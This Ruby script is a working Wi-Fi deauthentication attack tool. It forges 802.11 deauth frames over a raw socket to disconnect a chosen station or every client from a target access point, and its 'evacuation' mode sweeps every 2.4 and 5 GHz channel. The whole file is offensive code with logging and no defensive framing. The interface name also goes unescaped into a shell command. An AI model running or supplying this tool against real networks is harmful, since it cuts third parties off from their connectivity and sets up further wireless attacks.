#!/usr/bin/env ruby
# frozen_string_literal: true

require 'socket'
require 'json'
require 'time'

ETH_P_ALL = [0x0003].pack('n').unpack1('S')

def mac2bin(s)
  s.split(':').map { |b| b.to_i(16).chr }.join
end

def if_nametoindex(name)
  Socket.getifaddrs.select { |a| a.name == name }.first&.ifindex
end

def build_deauth(bssid, station, seq, reason)
  fc = [0xc0, 0x00].pack('C*')
  dur = [0x013a].pack('v')
  sc = [seq << 4].pack('v')
  reason_code = [reason].pack('v')
  fc + dur + station + bssid + bssid + sc + reason_code
end

begin
  iface = ARGV[0]
  bssid_raw = ARGV[1]
  station_raw = ARGV[2] || 'ff:ff:ff:ff:ff:ff'
  count = (ARGV[3] || 10).to_i
  rate = (ARGV[4] || 100).to_i
  mode = ARGV[5] || 'targeted'

  raise 'interface required' unless iface
  raise 'bssid required' unless bssid_raw
  ifidx = if_nametoindex(iface)
  raise "interface #{iface} not found" unless ifidx

  bssid = mac2bin(bssid_raw)
  station = station_raw == 'ff:ff:ff:ff:ff:ff' ? "\xff\xff\xff\xff\xff\xff" : mac2bin(station_raw)

  puts JSON.generate({ event: 'deauth_start', iface: iface, bssid: bssid_raw,
    data: { count: count, rate: rate, mode: mode },
    timestamp: Time.now.iso8601 })
  $stdout.flush

  if mode == 'evacuation'
    channels = [1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140]
    total_sent = 0
    sock = Socket.new(Socket::PF_PACKET, Socket::SOCK_RAW, ETH_P_ALL)
    channels.each do |ch|
      system("iw dev #{iface} set channel #{ch} 2>/dev/null")
      seq = rand(0..4095)
      frame = build_deauth(bssid, station, seq, 7)
      addr = Socket.pack_sockaddr_ll(ETH_P_ALL, ifidx, 0, 0, 0, '')
      3.times do
        sock.send(frame, 0, addr)
        total_sent += 1
      end
      puts JSON.generate({ event: 'evacuation_channel', iface: iface,
        bssid: bssid_raw, data: { channel: ch, total_sent: total_sent },
        timestamp: Time.now.iso8601 })
      $stdout.flush
    end
    sock.close
    puts JSON.generate({ event: 'deauth_complete', iface: iface, bssid: bssid_raw,
      data: { type: 'evacuation', channels: channels.size, total_sent: total_sent },
      timestamp: Time.now.iso8601 })
    $stdout.flush
  elsif mode == 'broadcast'
    total_sent = 0
    sock = Socket.new(Socket::PF_PACKET, Socket::SOCK_RAW, ETH_P_ALL)
    count.times do |i|
      seq = rand(0..4095)
      frame = build_deauth(bssid, station, seq, 7)
      addr = Socket.pack_sockaddr_ll(ETH_P_ALL, ifidx, 0, 0, 0, '')
      sock.send(frame, 0, addr)
      total_sent += 1
      puts JSON.generate({ event: 'deauth_sent', iface: iface, bssid: bssid_raw,
        data: { method: 'raw', seq: seq, sent: total_sent, total: count, rate: rate },
        timestamp: Time.now.iso8601 })
      $stdout.flush
      sleep(rate.to_f / 1000.0) if count > 1
    end
    sock.close
    puts JSON.generate({ event: 'deauth_complete', iface: iface, bssid: bssid_raw,
      data: { type: 'broadcast', sent: total_sent }, timestamp: Time.now.iso8601 })
    $stdout.flush
  else
    total_sent = 0
    sock = Socket.new(Socket::PF_PACKET, Socket::SOCK_RAW, ETH_P_ALL)
    count.times do
      seq = rand(0..4095)
      frame = build_deauth(bssid, station, seq, 7)
      addr = Socket.pack_sockaddr_ll(ETH_P_ALL, ifidx, 0, 0, 0, '')
      sock.send(frame, 0, addr)
      total_sent += 1
      puts JSON.generate({ event: 'deauth_sent', iface: iface, bssid: bssid_raw,
        data: { method: 'raw', seq: seq, sent: total_sent, total: count, rate: rate,
                target: station_raw }, timestamp: Time.now.iso8601 })
      $stdout.flush
      sleep(rate.to_f / 1000.0)
    end
    sock.close
    puts JSON.generate({ event: 'deauth_complete', iface: iface, bssid: bssid_raw,
      data: { type: 'targeted', sent: total_sent, reason: 7, station: station_raw },
      timestamp: Time.now.iso8601 })
    $stdout.flush
  end

rescue Interrupt
  puts JSON.generate({ event: 'deauth_interrupted', iface: iface || '',
    data: { status: 'interrupted', sent: total_sent || 0 },
    timestamp: Time.now.iso8601 })
rescue => e
  $stderr.puts JSON.generate({ event: 'error', data: { message: e.message,
    backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601 })
  exit 1
end
